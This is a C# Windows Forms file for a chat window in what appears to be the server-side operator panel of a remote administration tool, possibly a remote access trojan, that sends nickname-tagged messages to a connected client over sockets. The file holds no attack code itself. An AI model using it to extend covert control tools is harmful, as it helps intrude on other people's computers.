using Server.MessagePack;
using Server.Sockets;
using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;

namespace Server.Forms
{
    public partial class FormChat : Form
    {
        public Form1 F { get; set; }
        internal Clients C { get; set; }
        private string Nickname = "Admin";
        public FormChat()
        {
            InitializeComponent();
        }

        private void TextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData == Keys.Enter && !string.IsNullOrWhiteSpace(textBox1.Text))
            {
                richTextBox1.AppendText("ME: " + textBox1.Text + Environment.NewLine);
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "chatWriteInput";
                msgpack.ForcePathObject("Input").AsString = Nickname + ": " + textBox1.Text;
                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                textBox1.Clear();
            }
        }

        private void FormChat_Load(object sender, EventArgs e)
        {
            string nick = Interaction.InputBox("TYPE YOUR NICKNAME", "CHAT", "Admin");
            if (string.IsNullOrEmpty(nick))
                this.Close();
            else
            {
                Nickname = nick;
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "chat";
                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
            }
        }

        private void FormChat_FormClosed(object sender, FormClosedEventArgs e)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "chatExit";
            ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            if (!C.ClientSocket.Connected) this.Close();
        }
    }
}
